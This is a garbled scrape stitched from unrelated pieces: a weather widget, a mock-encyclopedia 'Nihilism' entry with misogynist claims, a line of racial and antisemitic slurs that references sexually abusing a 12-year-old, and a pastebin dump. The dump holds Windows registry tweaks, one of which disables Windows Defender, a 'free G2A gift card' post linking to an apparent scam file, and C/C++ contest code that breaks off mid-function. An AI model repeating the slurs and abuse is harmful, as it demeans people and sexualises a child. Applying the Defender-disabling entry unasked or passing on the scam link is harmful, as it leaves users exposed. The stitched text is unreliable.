P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎5‎°‎
/‎5‎6‎°‎
3‎%‎
E‎N‎E‎ ‎7‎ ‎m‎p‎h‎
S‎a‎t‎ ‎2‎3‎ ‎|‎ ‎D‎a‎y‎
7‎5‎°‎
3‎%‎
E‎N‎E‎
7‎
 ‎
m‎p‎h‎
A‎ ‎m‎i‎x‎ ‎o‎f‎ ‎c‎l‎o‎u‎d‎s‎ ‎a‎n‎d‎ ‎s‎u‎n‎ ‎d‎u‎r‎i‎n‎g‎ ‎t‎h‎e‎ ‎m‎o‎r‎n‎i‎n‎g‎ ‎w‎i‎l‎l‎ ‎g‎i‎v‎e‎ ‎w‎a‎y‎ ‎t‎o‎ ‎c‎l‎o‎u‎d‎y‎ ‎s‎k‎i‎e‎s‎ ‎t‎h‎i‎s‎ ‎a‎f‎t‎e‎r‎n‎o‎o‎n‎.‎ ‎H‎i‎g‎h‎ ‎a‎r‎o‎u‎n‎d‎ ‎7‎5‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎E‎N‎E‎ ‎a‎t‎ ‎5‎ ‎t‎o‎ ‎1‎0‎ ‎m‎p‎h‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
7‎2‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
8‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
7‎:‎2‎9‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
7‎:‎4‎3‎ ‎p‎m‎
S‎a‎t‎ ‎2‎3‎ ‎|‎ ‎N‎i‎g‎h‎t‎
5‎6‎°‎
8‎%‎
S‎E‎
7‎
 ‎
m‎p‎h‎
C‎l‎o‎u‎d‎y‎.‎ ‎L‎o‎w‎ ‎5‎6‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎E‎ ‎a‎t‎ ‎5‎ ‎t‎o‎ ‎1‎0‎ ‎m‎p‎h‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
7‎8‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
6‎:‎3‎4‎ ‎p‎m‎
W‎a‎x‎i‎n‎g‎ ‎G‎i‎b‎b‎o‎u‎s‎
M‎o‎o‎n‎s‎e‎t‎
6‎:‎4‎9‎ ‎a‎m‎
S‎u‎n‎ ‎2‎4‎
C‎l‎o‎u‎d‎y‎
7‎5‎°‎
/‎6‎3‎°‎
1‎1‎%‎
S‎S‎E‎ ‎2‎0‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎5‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎6‎°‎
/‎4‎9‎°‎
8‎2‎%‎
N‎W‎ ‎1‎0‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎6‎
S‎u‎n‎n‎y‎
7‎0‎°‎
/‎4‎7‎°‎
1‎%‎
N‎ ‎1‎1‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎7‎
P‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
6‎8‎°‎
/‎4‎7‎°‎
3‎1‎%‎
N‎N‎E‎ ‎1‎0‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎8‎
S‎u‎n‎n‎y‎
7‎3‎°‎
/‎5‎2‎°‎
8‎%‎
N‎N‎E‎ ‎9‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎9‎°‎
/‎6‎1‎°‎
8‎%‎
S‎ ‎1‎5‎ ‎m‎p‎h‎
S‎a‎t‎ ‎3‎0‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎0‎°‎
/‎6‎6‎°‎
7‎%‎
S‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
S‎u‎n‎ ‎3‎1‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
8‎4‎°‎
/‎6‎7‎°‎
3‎4‎%‎
S‎ ‎1‎4‎ ‎m‎p‎h‎
M‎o‎n‎ ‎0‎1‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
7‎9‎°‎
/‎5‎8‎°‎
1‎0‎%‎
N‎W‎ ‎1‎4‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎2‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎7‎°‎
/‎5‎4‎°‎
4‎%‎
N‎ ‎1‎2‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎3‎
P‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
7‎4‎°‎
/‎5‎4‎°‎
3‎3‎%‎
N‎N‎E‎ ‎1‎0‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎4‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎8‎°‎
/‎6‎1‎°‎
5‎%‎
E‎S‎E‎ ‎1‎0‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎5‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎1‎°‎
/‎6‎0‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎6‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎0‎°‎
/‎6‎0‎°‎
2‎4‎%‎
S‎ ‎1‎2‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎V‎l‎a‎d‎i‎m‎i‎r‎ ‎P‎u‎t‎i‎n‎.‎ ‎👴🏻

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

N‎i‎h‎i‎l‎i‎s‎m‎
N‎i‎h‎i‎l‎i‎s‎m‎ ‎i‎s‎ ‎t‎h‎e‎ ‎p‎u‎r‎p‎o‎r‎t‎e‎d‎ ‎i‎d‎e‎o‎l‎o‎g‎y‎ ‎o‎f‎ ‎A‎n‎o‎n‎y‎m‎o‎u‎s‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎m‎o‎r‎a‎l‎ ‎f‎r‎a‎m‎e‎w‎o‎r‎k‎ ‎f‎o‎r‎ ‎E‎n‎c‎y‎c‎l‎o‎p‎e‎d‎i‎a‎ ‎D‎r‎a‎m‎a‎t‎i‎c‎a‎.‎ ‎A‎ ‎n‎i‎h‎i‎l‎i‎s‎t‎i‎c‎ ‎a‎t‎t‎i‎t‎u‎d‎e‎ ‎i‎n‎v‎o‎l‎v‎e‎s‎ ‎e‎x‎i‎s‎t‎e‎n‎t‎i‎a‎l‎l‎y‎ ‎d‎e‎n‎y‎i‎n‎g‎ ‎t‎h‎e‎ ‎m‎e‎t‎a‎p‎h‎y‎s‎i‎c‎a‎l‎,‎ ‎e‎p‎i‎s‎t‎e‎m‎o‎l‎o‎g‎i‎c‎a‎l‎ ‎a‎n‎d‎,‎ ‎e‎s‎p‎e‎c‎i‎a‎l‎l‎y‎,‎ ‎e‎t‎h‎i‎c‎a‎l‎ ‎t‎r‎u‎t‎h‎-‎v‎a‎l‎u‎e‎s‎ ‎o‎f‎ ‎e‎v‎e‎r‎y‎t‎h‎i‎n‎g‎ ‎p‎e‎r‎t‎a‎i‎n‎i‎n‎g‎ ‎t‎o‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎.‎ ‎I‎n‎ ‎o‎t‎h‎e‎r‎ ‎w‎o‎r‎d‎s‎,‎ ‎t‎h‎e‎ ‎w‎e‎a‎k‎e‎s‎t‎ ‎i‎n‎t‎e‎l‎l‎e‎c‎t‎u‎a‎l‎ ‎e‎x‎c‎u‎s‎e‎ ‎t‎o‎ ‎d‎o‎ ‎i‎t‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎l‎u‎l‎z‎.‎ ‎W‎h‎e‎n‎ ‎a‎p‎p‎l‎i‎e‎d‎ ‎i‎n‎ ‎p‎r‎a‎c‎t‎i‎s‎e‎,‎ ‎n‎i‎h‎i‎l‎i‎s‎m‎ ‎b‎e‎c‎o‎m‎e‎s‎ ‎t‎h‎e‎ ‎s‎w‎e‎e‎t‎ ‎p‎h‎i‎l‎o‎s‎o‎p‎h‎i‎c‎a‎l‎ ‎n‎e‎c‎t‎a‎r‎ ‎f‎r‎o‎m‎ ‎w‎h‎i‎c‎h‎ ‎a‎l‎l‎ ‎w‎i‎n‎ ‎f‎l‎o‎w‎s‎ ‎f‎o‎r‎t‎h‎.‎ ‎W‎i‎e‎l‎d‎i‎n‎g‎ ‎t‎h‎i‎s‎ ‎w‎e‎a‎p‎o‎n‎ ‎o‎f‎ ‎t‎h‎o‎u‎g‎h‎t‎ ‎a‎g‎a‎i‎n‎s‎t‎ ‎o‎n‎e‎'‎s‎ ‎e‎n‎e‎m‎y‎ ‎w‎i‎l‎l‎ ‎b‎r‎i‎n‎g‎ ‎m‎u‎c‎h‎ ‎j‎o‎y‎ ‎a‎n‎d‎ ‎w‎i‎l‎l‎ ‎h‎a‎r‎d‎e‎n‎ ‎t‎h‎e‎ ‎h‎e‎a‎r‎t‎s‎ ‎o‎f‎ ‎a‎n‎y‎ ‎m‎a‎n‎.‎ ‎I‎t‎ ‎i‎s‎ ‎w‎e‎l‎l‎ ‎k‎n‎o‎w‎n‎ ‎t‎h‎a‎t‎ ‎w‎o‎m‎e‎n‎ ‎c‎a‎n‎'‎t‎ ‎b‎e‎ ‎n‎i‎h‎i‎l‎i‎s‎t‎s‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎t‎h‎e‎y‎ ‎a‎r‎e‎ ‎e‎m‎o‎t‎i‎o‎n‎a‎l‎,‎ ‎g‎e‎t‎ ‎e‎a‎s‎i‎l‎y‎ ‎s‎a‎d‎d‎e‎n‎e‎d‎,‎ ‎a‎n‎d‎ ‎a‎r‎e‎ ‎t‎h‎u‎s‎ ‎m‎a‎d‎e‎ ‎o‎f‎ ‎d‎i‎s‎g‎u‎s‎t‎i‎n‎g‎ ‎f‎a‎i‎l‎.‎ ‎T‎h‎i‎s‎ ‎i‎s‎ ‎w‎h‎y‎ ‎t‎h‎e‎y‎ ‎b‎e‎l‎o‎n‎g‎ ‎w‎h‎e‎r‎e‎ ‎t‎h‎e‎y‎ ‎a‎r‎e‎ ‎m‎o‎s‎t‎ ‎c‎o‎m‎f‎o‎r‎t‎a‎b‎l‎e‎.‎


(‎(‎ ‎T‎h‎e‎r‎e‎'‎s‎ ‎N‎o‎t‎h‎i‎n‎g‎ ‎W‎a‎i‎t‎i‎n‎g‎ ‎F‎o‎r‎ ‎Y‎o‎u‎ ‎A‎t‎ ‎T‎h‎e‎ ‎E‎n‎d‎.‎ ‎B‎e‎ ‎L‎i‎k‎e‎ ‎U‎s‎.‎ ‎S‎p‎e‎n‎d‎ ‎E‎v‎e‎r‎y‎ ‎M‎i‎n‎u‎t‎e‎ ‎Y‎o‎u‎ ‎H‎a‎v‎e‎ ‎L‎e‎f‎t‎ ‎W‎i‎t‎h‎ ‎W‎o‎m‎e‎n‎,‎ ‎C‎o‎k‎e‎ ‎A‎n‎d‎ ‎I‎n‎s‎a‎n‎e‎ ‎A‎m‎o‎u‎n‎t‎s‎ ‎O‎f‎ ‎C‎a‎s‎h‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

F‎r‎e‎r‎e‎ ‎H‎a‎l‎l‎ ‎i‎s‎ ‎a‎ ‎b‎u‎i‎l‎d‎i‎n‎g‎ ‎i‎n‎ ‎K‎a‎r‎a‎c‎h‎i‎,‎ ‎P‎a‎k‎i‎s‎t‎a‎n‎,‎ ‎b‎u‎i‎l‎t‎ ‎i‎n‎ ‎1‎8‎6‎5‎ ‎t‎o‎ ‎s‎e‎r‎v‎e‎ ‎a‎s‎ ‎t‎h‎e‎ ‎c‎i‎t‎y‎'‎s‎ ‎t‎o‎w‎n‎ ‎h‎a‎l‎l‎ ‎d‎u‎r‎i‎n‎g‎ ‎B‎r‎i‎t‎i‎s‎h‎ ‎c‎o‎l‎o‎n‎i‎a‎l‎ ‎r‎u‎l‎e‎ ‎i‎n‎ ‎t‎h‎e‎ ‎I‎n‎d‎i‎a‎n‎ ‎s‎u‎b‎c‎o‎n‎t‎i‎n‎e‎n‎t‎.‎ ‎N‎a‎m‎e‎d‎ ‎i‎n‎ ‎1‎8‎8‎4‎ ‎i‎n‎ ‎h‎o‎n‎o‎u‎r‎ ‎o‎f‎ ‎H‎e‎n‎r‎y‎ ‎B‎a‎r‎t‎l‎e‎ ‎F‎r‎e‎r‎e‎,‎ ‎a‎ ‎B‎r‎i‎t‎i‎s‎h‎ ‎a‎d‎m‎i‎n‎i‎s‎t‎r‎a‎t‎o‎r‎ ‎w‎h‎o‎ ‎h‎a‎d‎ ‎e‎a‎r‎l‎i‎e‎r‎ ‎s‎e‎r‎v‎e‎d‎ ‎a‎s‎ ‎C‎o‎m‎m‎i‎s‎s‎i‎o‎n‎e‎r‎ ‎o‎f‎ ‎S‎i‎n‎d‎ ‎a‎n‎d‎ ‎G‎o‎v‎e‎r‎n‎o‎r‎ ‎o‎f‎ ‎B‎o‎m‎b‎a‎y‎,‎ ‎t‎h‎e‎ ‎b‎u‎i‎l‎d‎i‎n‎g‎ ‎i‎s‎ ‎n‎o‎w‎ ‎a‎ ‎l‎i‎b‎r‎a‎r‎y‎ ‎a‎n‎d‎ ‎a‎ ‎t‎o‎u‎r‎i‎s‎t‎ ‎a‎t‎t‎r‎a‎c‎t‎i‎o‎n‎ ‎n‎o‎t‎e‎d‎ ‎f‎o‎r‎ ‎i‎t‎s‎ ‎V‎e‎n‎e‎t‎i‎a‎n‎ ‎G‎o‎t‎h‎i‎c‎ ‎a‎r‎c‎h‎i‎t‎e‎c‎t‎u‎r‎e‎,‎ ‎a‎n‎d‎ ‎i‎s‎ ‎a‎l‎s‎o‎ ‎u‎s‎e‎d‎ ‎f‎o‎r‎ ‎e‎x‎h‎i‎b‎i‎t‎i‎o‎n‎s‎ ‎a‎n‎d‎ ‎e‎v‎e‎n‎t‎s‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎d‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎A‎l‎e‎x‎a‎n‎d‎e‎r‎ ‎S‎a‎v‎i‎n‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

W‎e‎l‎l‎ ‎J‎e‎w‎i‎s‎h‎ ‎n‎i‎g‎g‎e‎r‎ ‎s‎p‎i‎c‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎e‎a‎t‎ ‎a‎ ‎1‎2‎ ‎y‎e‎a‎r‎ ‎o‎l‎d‎'‎s‎ ‎p‎u‎s‎s‎y‎.‎"
wnb0qMBU,hide_copilot_button,Python253,REG,Saturday 23rd of March 2024 11:52:06 PM CDT,"""""""
=== DISCLAIMER ===
The following comments are for reference only and should not be included in the saved script.
 
File Data:
- Filename: hide_copilot_button.reg
- Version: 1.00
- Author: Jeoi Reqi

Registry Modification Notes:
- This '.reg' file hides the Copilot button by setting a new key under the Explorer advanced settings.
- It is recommended to create a backup of the registry before applying any changes.
==================
""""""

Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]
""ShowCortanaButton""=dword:00000000
"
SJbyU29T,show_copilot_button,Python253,REG,Saturday 23rd of March 2024 11:51:45 PM CDT,"""""""
=== DISCLAIMER ===
The following comments are for reference only and should not be included in the saved script.
 
File Data:
- Filename: show_copilot_button.reg
- Version: 1.00
- Author: Jeoi Reqi

Registry Modification Notes:
- This '.reg' file shows the Copilot button by setting a new key under the Explorer advanced settings.
- It is recommended to create a backup of the registry before applying any changes.
==================
""""""

Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]
""ShowCortanaButton""=dword:00000001
"
0Rf9F7tU,hide_copilot_button,Python253,REG,Saturday 23rd of March 2024 11:51:25 PM CDT,"""""""
=== DISCLAIMER ===
The following comments are for reference only and should not be included in the saved script.
 
File Data:
- Filename: hide_copilot_button.reg
- Version: 1.00
- Author: Jeoi Reqi

Registry Modification Notes:
- This '.reg' file hides the Copilot button by setting a new key under the Explorer advanced settings.
- It is recommended to create a backup of the registry before applying any changes.
==================
""""""

Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]
""ShowCopilotButton""=dword:00000000

"
W2Nrn36g,show_copilot_button,Python253,REG,Saturday 23rd of March 2024 11:51:02 PM CDT,"""""""
=== DISCLAIMER ===
The following comments are for reference only and should not be included in the saved script.
 
File Data:
- Filename: show_copilot_button.reg
- Version: 1.00
- Author: Jeoi Reqi

Registry Modification Notes:
- This '.reg' file shows the Copilot button by setting a new key under the Explorer advanced settings.
- It is recommended to create a backup of the registry before applying any changes.
==================
""""""

Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]
""ShowCopilotButton""=dword:00000001
"
aZLiCnix,disable_windows_defender,Python253,REG,Saturday 23rd of March 2024 11:50:34 PM CDT,"""""""
=== DISCLAIMER ===
The following comments are for reference only and should not be included in the saved script.
 
File Data:
- Filename: disable_windows_defender.reg
- Version: 1.00
- Author: Jeoi Reqi

Registry Modification Notes:
- This '.reg' file disables Windows Defender by setting a new key under the Windows Defender policy.
- It is recommended to create a backup of the registry before applying any changes.
==================
""""""

Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]
""DisableAntiSpyware""=dword:00000001

"
cyK5R4FH,enable_windows_defender,Python253,REG,Saturday 23rd of March 2024 11:50:12 PM CDT,"""""""
=== DISCLAIMER ===
The following comments are for reference only and should not be included in the saved script.
 
File Data:
- Filename: enable_windows_defender.reg
- Version: 1.00
- Author: Jeoi Reqi

Registry Modification Notes:
- This '.reg' file enables Windows Defender by setting a new key under the Windows Defender policy.
- It is recommended to create a backup of the registry before applying any changes.
==================
""""""

Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]
""DisableAntiSpyware""=dword:00000000

"
wJV6tnD5,disable_user_signed_in,Python253,REG,Saturday 23rd of March 2024 11:49:15 PM CDT,"""""""
=== DISCLAIMER ===
The following comments are for reference only and should not be included in the saved script.

File Data:
- Filename: disable_user_signed_in.reg
- Version: 1.00
- Author: Jeoi Reqi

Registry Modification Notes:
- This '.reg' file sets the value to disabled for user sign-in by editing the Windows registry.
- It is recommended to create a backup of the registry before applying any changes.
==================
""""""

Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer]
""UserSignedIn""=dword:00000000

"
kwinb646,enable_user_signed_in,Python253,REG,Saturday 23rd of March 2024 11:48:50 PM CDT,"""""""
=== DISCLAIMER ===
The following comments are for reference only and should not be included in the saved script.

File Data:
- Filename: enable_user_signed_in.reg
- Version: 1.00
- Author: Jeoi Reqi

Registry Modification Notes:
- This '.reg' file sets the value to enabled for user sign-in by editing the Windows registry.
- It is recommended to create a backup of the registry before applying any changes.
==================
""""""

Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer]
""UserSignedIn""=dword:00000001

"
J1uEUTA5,disable_show_seconds_in_system_clock,Python253,REG,Saturday 23rd of March 2024 11:48:10 PM CDT,"""""""
=== DISCLAIMER ===
The following comments are for reference only and should not be included in the saved script.

File Data:
- Filename: disable_show_seconds_in_system_clock.reg
- Version: 1.00
- Author: Jeoi Reqi

Registry Modification Notes:
- This '.reg' file sets the value to disabled for showing seconds in the system clock by editing the Windows registry.
- Disabling seconds display may help conserve power.
- It is recommended to create a backup of the registry before applying any changes.
==================
""""""

Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]
""ShowSecondsInSystemClock""=dword:00000000

"
4AZYGxea,enable_show_seconds_in_system_clock,Python253,REG,Saturday 23rd of March 2024 11:47:45 PM CDT,"""""""
=== DISCLAIMER ===
The following comments are for reference only and should not be included in the saved script.

File Data:
- Filename: enable_show_seconds_in_system_clock.reg
- Version: 1.00
- Author: Jeoi Reqi

Registry Modification Notes:
- This '.reg' file sets the value to enabled for showing seconds in the system clock by editing the Windows registry.
- Enabling seconds display may consume more power.
- It is recommended to create a backup of the registry before applying any changes.
==================
""""""

Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]
""ShowSecondsInSystemClock""=dword:00000001

"
8EErfdiD,disable_explorer_startup_trace,Python253,REG,Saturday 23rd of March 2024 11:47:03 PM CDT,"""""""
=== DISCLAIMER ===
The following comments are for reference only and should not be included in the saved script.

File Data:
- Filename: disable_explorer_startup_trace.reg
- Version: 1.00
- Author: Jeoi Reqi

Registry Modification Notes:
- This '.reg' file sets the value to disabled for Explorer startup trace recording by editing the Windows registry.
- It is recommended to create a backup of the registry before applying any changes.
==================
""""""

Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer]
""ExplorerStartupTraceRecorded""=dword:00000000

"
jvfnyHCg,enable_explorer_startup_trace,Python253,REG,Saturday 23rd of March 2024 11:46:35 PM CDT,"""""""
=== DISCLAIMER ===
The following comments are for reference only and should not be included in the saved script.

File Data:
- Filename: enable_explorer_startup_trace.reg
- Version: 1.00
- Author: Jeoi Reqi

Registry Modification Notes:
- This '.reg' file sets the value to enabled for Explorer startup trace recording by editing the Windows registry.
- It is recommended to create a backup of the registry before applying any changes.
==================
""""""

Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer]
""ExplorerStartupTraceRecorded""=dword:00000001

"
NBjVgyQn,disable_edge_desktop_shortcut,Python253,REG,Saturday 23rd of March 2024 11:45:57 PM CDT,"""""""
=== DISCLAIMER ===
The following comments are for reference only and should not be included in the saved script.

File Data:
- Filename: disable_edge_desktop_shortcut.reg
- Version: 1.00
- Author: Jeoi Reqi

Registry Modification Notes:
- This '.reg' file sets the value to disabled for Edge desktop shortcut creation by editing the Windows registry.
- It is recommended to create a backup of the registry before applying any changes.
==================
""""""

Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer]
""EdgeDesktopShortcutCreated""=dword:00000000

"
hfasgDfT,enable_edge_desktop_shortcut,Python253,REG,Saturday 23rd of March 2024 11:45:36 PM CDT,"""""""
=== DISCLAIMER ===
The following comments are for reference only and should not be included in the saved script.

File Data:
- Filename: enable_edge_desktop_shortcut.reg
- Version: 1.00
- Author: Jeoi Reqi

Registry Modification Notes:
- This '.reg' file sets the value to enabled for Edge desktop shortcut creation by editing the Windows registry.
- It is recommended to create a backup of the registry before applying any changes.
==================
""""""

Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer]
""EdgeDesktopShortcutCreated""=dword:00000001

"
Dn4qbmhZ,disable_windows_copilot,Python253,REG,Saturday 23rd of March 2024 11:43:36 PM CDT,"""""""
=== DISCLAIMER ===
The following comments are for reference only and should not be included in the saved script.
 
File Data:
- Filename: disable_windows_copilot.reg
- Version: 1.00
- Author: Jeoi Reqi

Registry Modification Notes:
- This '.reg' file disables Windows Copilot by setting a new key under the Windows Copilot policy.
- It is recommended to create a backup of the registry before applying any changes.
==================
""""""

Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsCopilot]
""TurnOffWindowsCopilot""=dword:00000001
 
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsCopilot]
""TurnOffWindowsCopilot""=dword:00000001

"
1ZYPpLaT,Mad,Unknown_No_1,PHP,Saturday 23rd of March 2024 11:40:29 PM CDT,ThanksforComplete15kOnMadGamerTG
3rvnuYD8,🤑 G2A.com Free Gift Card Guide Mar 2024 FIX 🤑,PASUSW,GetText,Saturday 23rd of March 2024 11:13:09 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
24 March 2024
 
 
 
 
 
 
 
 
 
 
 
 








"
xWqPY3WD,Untitled,wym1111,C++,Saturday 23rd of March 2024 10:51:16 PM CDT,"#include <bits/stdc++.h>
using namespace std;

const int N = 2e5 + 10;

int n, a[N];
int vis[N];
int dep[N];

int ans = N;

void dfs (int x, int d, int v) {
//	cout << x << ' ' << d << ' ' << dep[x] << endl;
	if (vis[x]) {
		if (v == vis[x]) ans = min(ans, d - dep[x]);
		return;
	}
	vis[x] = v;
	dep[x] = d;
	dfs(a[x], d + 1, v);
}

int main () {
	cin >> n;
	for (int i = 1; i <= n; i ++) {
		cin >> a[i];
	}
	for (int i = 1; i <= n; i ++) {
		if (vis[i]) continue;
		dfs(i, 1, i);
	}
	cout << ans << endl;
	return 0;
}"
d9dAASH2,DSA_DSA,Tony041010,C,Saturday 23rd of March 2024 10:46:16 PM CDT,"#include<stdio.h>
#include<stdlib.h>

#define ll long long int
// #define MAXN 1000000
// #define MAXT 500000
// #define MAXM 500000
#define MAXN 100
#define MAXT 50
#define MAXM 50

typedef struct {
    ll *array;
    ll size;
    ll capacity;
} Vector;

void Vector_init(Vector *vec) {
    vec->array = NULL;
    vec->size = 0;
    vec->capacity = 0;
}

void Vector_push_back(Vector *vec, ll value) {
    if (vec->size == vec->capacity) {
        vec->capacity = (vec->capacity == 0) ? 1 : vec->capacity * 2;
        vec->array = (ll *)realloc(vec->array, vec->capacity * sizeof(ll));
    }
    vec->array[vec->size] = value;
    vec->size++;
}

int PowerBinarySearch(ll power[MAXN+1], ll standard, int l, int r)
{
    int m = -1;
    while(l < r){
        m = ((l+r+1)/2); // why +1? I want the one who is slightly on the right
        //printf(""l: %d r: %d m: %d\n"", l, r, m);
        if(power[m] >= standard){
            l = m;
        }
        else{
            r = m-1;
        }
    }
    if(m == -1){
        return -1;
    }
    else{
        return r;
    }
}

void PrintStatus(int label[MAXN+1], ll power[MAXN+1], int N)
{
    printf(""-------------------\n"");
    printf(""Format : Label(rank): power\n"");
    for(int i = 1 ; i <= N ; i++){
        printf(""%d(%d): %lld\n"", label[i], i, power[i]);
    }
    printf(""-------------------\n"");
    return;
}

void PrintVector(Vector *vec){
    for(int i = 0 ; i < vec->size ; i++){
        printf(""%lld "",vec->array[i]);
    }
    printf(""\n"");
    return;
}

void Attack(int label[MAXN+1], int rank[MAXN+1], ll power[MAXN+1], Vector* power_gains, int attack_times[MAXN+1], int attacker, int N, int M)
{
    if(attacker > N || attacker < 1){
        //printf(""Attcker not found.\n"");
        return;
    }

    int attacker_rank = rank[attacker];
    //printf(""Attacker_rank: %d\n"", attacker_rank);
    if(attacker_rank == 1){
        //printf(""The top one attacks.\n"");
    }
    else{
        attack_times[label[attacker_rank]]++;
        // printf(""The %d-th time attack of player %d.\n"", attack_times[label[attacker_rank]], label[attacker_rank]);
        // printf(""Gained power : %lld\n"", power[attacker_rank-1] - power[attacker_rank]);
        // printf(""Pushing powergains\n"");
        int attacker_label = label[attacker_rank];
        if(power_gains->size == 0){
            Vector_push_back(power_gains, power[attacker_rank-1] - power[attacker_rank]);
            // PrintVector(power_gains);
        }
        else{
            Vector_push_back(power_gains, power_gains->array[power_gains->size-1] + (power[attacker_rank-1] - power[attacker_rank]));
            // PrintVector(power_gains);
        }
        // printf(""Done\n"");

        rank[label[attacker_rank]]--;
        rank[label[attacker_rank-1]]++;

        power[attacker_rank] = power[attacker_rank-1];
        int temp_label = label[attacker_rank];
        label[attacker_rank] = label[attacker_rank-1];
        label[attacker_rank-1] = temp_label;
    }

    return;
}

void Reward(ll power[MAXN+1], int N)
{
    for(int i = 1 ; i <= N ; i++){
        power[i] += (N-i);
    }
    return;
}

void Query(int label[MAXN+1], ll power[MAXN+1], ll standard, int N)
{
    if(standard > power[1]){
        printf(""0 0\n"");
        return;
    }

    int last_rank = PowerBinarySearch(power, standard, 1, N);
    if(last_rank == -1){
        printf(""0 0\n"");
    }
    else{
        printf(""%d %d\n"", last_rank, label[last_rank]);
    }
    return;
}


void GetPowerGains(Vector* power_gains, int attack_times[MAXN+1], int target_label, int attack_tms)
{
    if(power_gains->size == 0){
        printf(""0\n"");
        return;
    }
    if(attack_tms >= attack_times[target_label]){ // the total gains
        printf(""%lld\n"", power_gains->array[power_gains->size-1]);
    }
    else{
        // printf(""Size : %lld\n"", power_gains->size);
        int index = attack_times[target_label] - attack_tms - 1;
        // printf(""INdex: %lld\n"", index);
        printf(""%lld\n"", power_gains->array[power_gains->size-1] - power_gains->array[index]);
    }
    return;
}

void PrintGameRecord(Vector power_gains[MAXN+1], int attack_times[MAXN+1], int N)
{
    printf(""\n"");
